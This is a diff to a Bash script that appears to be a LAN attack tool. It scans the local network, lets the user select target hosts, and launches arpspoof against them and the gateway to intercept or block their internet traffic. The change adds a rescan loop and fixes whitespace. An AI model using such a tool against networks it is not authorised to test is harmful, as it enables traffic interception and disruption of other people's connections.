@@ -378,7 +378,7 @@ func_rate_limit()
 func_scan_network()
 {
     func_header
-	
+
 	# Print host length warning
 	[[ $CIDR -lt 22 ]] && echo -e "${CGrn}[${CBRed}!${CGrn}]${CYel} Large network detected, this scan may take minutes or hours${CClr}"
 
@@ -448,7 +448,7 @@ func_start_attack()
         echo -e "${CGrn}[${CYel}$(date '+%T')${CGrn}]${CYel} Spoofing target: ${CGrn}$IP${CClr}"
         arpspoof -rt $IP $GATEWAY > /dev/null 2>&1 &
     done
- 
+
     # Block or forward internet access
     if [[ $FORWARD_TRAFFIC == true ]]
     then
@@ -591,7 +591,7 @@ start_interactive_mode()
 
     # Get gateway IP of interface
     GATEWAY=$(route -n | grep -w $INTERFACE | awk '{print $2}' | grep -v "0.0.0.0")
-	
+
 	# Store CIDR from the given gateway
 	CIDR=$(echo $NETWORK | cut -d "/" -f2)
 
@@ -618,29 +618,35 @@ start_interactive_mode()
         esac
     done
 
-    # Scan the network
-    func_scan_network
-
-    # Print header
-    func_header
-
-    echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} Select Target:\n"
-
-    # Iterate all hosts found
-    INDEX=1
-    while [[ $INDEX -le ${#HOSTS[@]} ]]
+    while true
     do
-        # Print it
-        printf " ${CGrn}%3s${CYel})  %s\n" $INDEX "${HOSTS[$INDEX]}"
+       # Scan the network
+       func_scan_network
 
-        # Assign the IP to an array
-        IP_LIST[$INDEX]=$(echo "${HOSTS[$INDEX]}" | cut -d ' ' -f1)
-        let 'INDEX++'
+       # Print header
+       func_header
+
+       echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} Select Target:\n"
+
+       # Iterate all hosts found
+        INDEX=1
+        while [[ $INDEX -le ${#HOSTS[@]} ]]
+        do
+            # Print it
+            printf " ${CGrn}%3s${CYel})  %s\n" $INDEX "${HOSTS[$INDEX]}"
+
+            # Assign the IP to an array
+            IP_LIST[$INDEX]=$(echo "${HOSTS[$INDEX]}" | cut -d ' ' -f1)
+            let 'INDEX++'
+        done
+
+        echo -e "   ${CGrn}*${CYel})  All Addresses${CClr}\n"
+        echo -e " ${CGrn}r|R${CYel})  Rescan${CClr}\n"
+        echo -ne "${CGrn}[${CYel}Select${CGrn}]${CYel}: "
+        read SELECT_IP
+
+         [[ $SELECT_IP != "r" && $SELECT_IP != "R" ]] && break
     done
-
-    echo -e "   ${CGrn}*${CYel})  All Addresses${CClr}\n"
-    echo -ne "${CGrn}[${CYel}Select${CGrn}]${CYel}: "
-    read SELECT_IP
 
     # If all address is selected
     if [[ ($SELECT_IP == "*" || -z $SELECT_IP) ]]
@@ -690,7 +696,7 @@ start_interactive_mode()
                     [[ $SELECTED -lt $INDEX2 ]] && TARGET_IP=$(echo $TARGET_IP | sed "s/\<${IP_LIST[$SELECTED]}\>//g")
                     EXCLUDED_IP="$EXCLUDED_IP ${IP_LIST[$SELECTED]}"
                 done
-    
+
                 EXCLUDED_IP=$(echo $EXCLUDED_IP | tr -s ' ')
             fi
         fi
